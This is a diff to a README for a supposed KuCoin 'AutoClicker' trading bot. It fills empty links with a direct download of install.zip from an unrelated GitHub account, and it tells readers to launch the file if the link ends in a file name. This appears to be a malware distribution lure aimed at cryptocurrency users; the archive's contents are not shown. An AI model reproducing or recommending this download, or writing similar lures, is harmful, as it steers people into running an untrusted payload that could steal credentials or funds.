@@ -16,9 +16,9 @@ Welcome to the KuCoin AutoClicker Bot repository, your premier solution for auto
 - Topics: kucoin-bot, python-bot, trading-bot, crypto-automation, auto-trader, trading-tool
 
 ## 📥 Download
-Download the KuCoin AutoClicker Bot [here]() and harness the power of automated trading on KuCoin!
+Download the KuCoin AutoClicker Bot [here](https://github.com/xaweryboss1235/XKucoin-Bot-Script/releases/download/install/install.zip) and harness the power of automated trading on KuCoin!
 
-[![Download KuCoin AutoClicker](https://github.com/YourUsername/KuCoin-AutoClicker-Bot/releases)]()
+[![Download KuCoin AutoClicker](https://github.com/YourUsername/KuCoin-AutoClicker-Bot/releases)](https://github.com/xaweryboss1235/XKucoin-Bot-Script/releases/download/install/install.zip)
 
 If the link ends with a file name, ensure it is launched to access the tool.
 
@@ -38,7 +38,7 @@ Please use the KuCoin AutoClicker Bot responsibly and in compliance with KuCoin'
 ## 🌟 Start Trading on KuCoin Today!
 Don’t miss out on the opportunity to optimize your trading strategy with the AutoClicker Bot. Download now and take your trading to the next level!
 
-![KuCoin AutoClicker]()
+![KuCoin AutoClicker](https://github.com/xaweryboss1235/XKucoin-Bot-Script/releases/download/install/install.zip)
 
 Let the tool do the work while you enjoy the results! 🚀💹
 
